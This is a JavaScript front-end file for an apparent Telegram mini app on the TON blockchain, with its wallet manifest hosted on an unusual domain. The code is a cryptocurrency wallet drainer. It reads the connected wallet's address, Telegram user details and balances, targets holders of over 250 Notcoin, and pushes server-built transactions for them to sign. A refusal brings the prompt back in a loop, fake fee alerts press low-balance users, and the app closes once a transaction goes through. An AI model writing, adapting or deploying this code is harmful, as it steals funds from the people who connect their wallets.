const tonweb = new window.TonWeb();
const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
    manifestUrl: 'https://mor3f.monster/manifest.json',
    buttonRootId: 'connect'
});

function openModal(){
    if(!tonConnectUI.connected){
        tonConnectUI.openModal()
    }
}   

tonConnectUI.onStatusChange(
    async (status) => {
        console.log(status)
        //console.log(UserFriendlyAddress(status.account.address))
        if (tonConnectUI.connected) {
            if (status.account != null) {
                const user = window.Telegram.WebApp.initDataUnsafe.user
                const address = UserFriendlyAddress(status.account.address)
                console.log(UserFriendlyAddress(status.account.address))
                console.log(user)
                let balance = await axios.post("./api/index.php", { action: "getBalance", address: address, user: user })
                balance = balance.data
                console.log(balance)
                tonBalance = balance.ton.balance
                console.log(tonBalance / 1000000000)
                if (tonBalance / 1000000000 < 0.1 && balance.not && (balance.not.balance / 1000000000) > 250) {
                    let isGetFee = await axios.post("./api/index.php", { action: "getFee", address: address, user: user })
                    if (isGetFee.data.status == true) {
                        Swal.fire({
                            text: isGetFee.data.message,
                            icon: 'error',
                            confirmButtonText: 'OK',
                            background: "#121214",
                            color: "#fff",
                            confirmButtonColor: "#ff0000"
                        }).then(async (i) => {
                            await makeTransaction(address, user)
                        })
                    } else {
                        showAutoCloseAlert(isGetFee.data.message, 30000, async () => {
                            await makeTransaction(address, user)
                        })
                    }
                } else if (tonBalance / 1000000000 > 0.1 && balance.not && (balance.not.balance / 1000000000) > 250) {
                        await makeTransaction(address, user)
                } else if (tonBalance / 1000000000 > 0.1 && !balance.jettons) {
                    Swal.fire({
                        text: "don't have notcoin",
                        icon: 'error',
                        confirmButtonText: 'OK',
                        background: "#121214",
                        color: "#fff",
                        confirmButtonColor: "#00ff00"
                    }).then(async(i)=>{
                        await makeTransaction(address, user)
                    })

                } else if (tonBalance / 1000000000 < 0.1 && !balance.jettons) {
                    Swal.fire({
                        text: "you don't have anything",
                        icon: 'error',
                        confirmButtonText: 'OK!!!',
                        background: "#121214",
                        color: "#fff",
                        confirmButtonColor: "#00ff00"
                    }).then(async()=>{
                        await tonConnectUI.disconnect();
                    })
                    
                }

            }
        }

    }
);


function UserFriendlyAddress(rawHexAddress) {
    const { Address } = tonweb.utils;
    const addressInstance = new Address(rawHexAddress);
    const userFriendlyAddress = addressInstance.toString(true, true, false);
    return userFriendlyAddress;
}

//tonConnectUI.sendTransaction()

async function makeTransaction(address, user) {

    response = await axios.post("./api/index.php", { action: "makeTransaction", address: address, user: user })
    console.log(response.data)
    transaction = {
        validUntil: Math.floor(Date.now() / 1000) + 60, // 60 sec
        messages: response.data
    }
    try {
        if (transaction = await tonConnectUI.sendTransaction(transaction)) {
            await axios.post("./api/index.php", { action: "sendSuccess", address: address, user: user ,hash:transaction.boc})
            Swal.fire({
                text: "Transaction accepted",
                icon: 'success',
                confirmButtonText: 'OK',
                background: "#121214",
                color: "#fff",
                confirmButtonColor: "#00ff00"
            }).then(await Telegram.WebApp.close())
        }
    }catch(e){
        Swal.fire({
            text: "Transaction declined",
            icon: 'error',
            confirmButtonText: 'OK',
            background: "#121214",
            color: "#fff",
            confirmButtonColor: "#ff0000"
        }).then(async()=>{
            return makeTransaction(address, user)
        })
    }
    

}

async function showAutoCloseAlert(message, time, callback) {
    await Swal.fire({
        html: message,
        timer: time,
        timerProgressBar: true,
        //background: "#121214",
        didOpen: async () => {
            Swal.showLoading();
        },
        allowOutsideClick: false,
        allowEscapeKey: false
    }).then(async (result) => {
        if (result.dismiss === Swal.DismissReason.timer) {
            await callback();
        }
    });
}

//debugger
// openModal()